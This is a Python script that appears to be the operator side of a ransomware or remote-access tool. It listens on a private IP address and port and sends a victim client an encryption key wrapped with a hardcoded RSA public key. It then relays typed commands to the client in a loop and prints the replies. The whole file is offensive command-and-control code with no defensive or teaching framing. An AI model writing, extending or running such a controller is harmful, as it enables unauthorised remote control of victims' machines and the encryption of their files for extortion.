import socket
import threading
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import time
from Crypto.Random import get_random_bytes




def lisner(pk,key) :
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(1)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    try:
        sock.bind(("192.168.109.130",4343))
        sock.listen(2)
        con, add = sock.accept()
    except Exception as e :
        time.sleep(1.5)
        lisner(pk, key)
    print("connection from {0}:{1}".format(add[0],add[1]))
    t = threading.Thread(args=(con,))
    pubkey = RSA.importKey(pk)
    c = PKCS1_OAEP.new(pubkey)
    en_key = c.encrypt(key.encode("utf-8"))
    con.send(en_key)
    print("your encrypted key is :",en_key)
    data = con.recv(1024)
    print(data.decode("utf-8"))
    s = input(">>")
    con.send(s.encode("utf-8"))
    while True :
        try :
                s = input(">>")
                con.send(s.encode("utf-8"))
                print(s)
                if s == "exit" :
                    print("connection closed")
                    con.close()
                    break   
                else: 
                    data = con.recv(1024)
                    print(data.decode("utf-8"))
                    data1 = con.recv(1024)
                    print(data1.decode("utf-8"))
                    if data.decode("utf-8") == "[+]going back" and data1.decode("utf-8") == "[+]going back completed successfully" :
                        data = con.recv(1024)
                        print(data.decode("utf-8"))
                        data1 = con.recv(1024)
                        print(data1.decode("utf-8"))
                        s = input(">>")
                        con.send(s.encode("utf-8"))
        except Exception as e :
                        continue


pub_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq/Z2uZw/5J3Hb0nzTfEC
PdzAumNhqrskAqd+oGbWO9U82MiysJtvxtOXUmLCWM0DSldTDoy4i5o3igkAGkcV
yg0/NTcKGFMHln2XwUSUg9f8yJHOpA7u7ckg/QBT4P41tQimHHS8x5jRfrEr/BuR
tnjoznZh+5FvK5ONPM/eBGLRR/0/FIUY0dg6yOM5R1VJGejgp/0/8XX7Ag7YpQNE
Iy63RTWJwd0S/3mgrJh1fusMA48yPLvapTg0yk5aZ6wXvwwcYxCgEkr3BQJKCim/
ve/fYkvASneYc+8HY/7Hmcrda30BDz1XvOu5LulyT+X/Ba7GWAhixnL3vjd/9Cn0
hQIDAQAB
-----END PUBLIC KEY-----"""
pub_key = pub_key.encode("utf-8")
key = input("==>please enter the symetrique key for encryption and saved it for decryption \n>>")
try:
      lisner(pub_key, key) 
except :
      lisner(pub_key, key)   
      
      
      
